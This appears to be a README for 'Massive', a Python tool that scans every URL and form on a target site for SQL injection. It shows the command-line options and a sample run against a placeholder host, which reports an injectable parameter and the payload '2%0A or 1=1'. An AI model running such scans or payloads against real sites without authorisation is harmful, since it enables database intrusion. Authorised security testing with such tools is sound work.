# Massive

SQLi massive seeker. 
Search for SQLi Vulnerabilities in every url and form


### help
```bash
$ python3 massive.py -h
usage: massive.py [-h] -u URL [--cookie] [--agent] [--level 0-2] [--scope 0-1]
                  [-v] [--endonsqli yes|no] [--sleeptime float]
                  [--empty_val string]

SQLi massive seeker. Search for SQLi in every url and form

optional arguments:
  -h, --help          show this help message and exit
  -u URL, --url URL   Target URL
  --cookie            Provide a specific cookie
  --agent             Provide a specific User Agent
  --level 0-2         Define test level
  --scope 0-1         Define scope
  -v, --verbose       Verbose output
  --endonsqli yes|no  Finish the scan when first sqli found. Default "yes"
  --sleeptime float   Seconds to sleep between connections
  --empty_val string  Value to field empty parameters. Default "1"

```
### use
```bash
$ python3 massive.py -u http://www.attacksite.com

        _/_/_/  _/_/      _/_/_/    _/_/_/    _/_/_/      _/      _/    _/_/
       _/    _/    _/  _/    _/  _/_/      _/_/      _/  _/      _/  _/_/_/_/
      _/    _/    _/  _/    _/      _/_/      _/_/  _/    _/  _/    _/
     _/    _/    _/    _/_/_/  _/_/_/    _/_/_/    _/      _/        _/_/_/      { v0.1  github.com/belane }
        
[i]  Scope: attacksite.com 
[i]  Setting User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0
[i]  Getting Cookie... setting Cookie: None
[-] 
[ ] 
[i]  Found: 13 LINKS, 2 POST, 4 GET
[-] 
[i]  Attack links.....................* 
[i]  Attack post 
[i]  Attack get
[-] 
[i]  1 SQLi FOUND!
[*]  URL http://www.attacksite.com/reports.php?name=_INJECT_HERE_
[ ] 	 Payload: 2%0A or 1=1
[ ] 	 Message type: SQL content error

```


[Video](https://youtu.be/HqmPrjj8wjE)


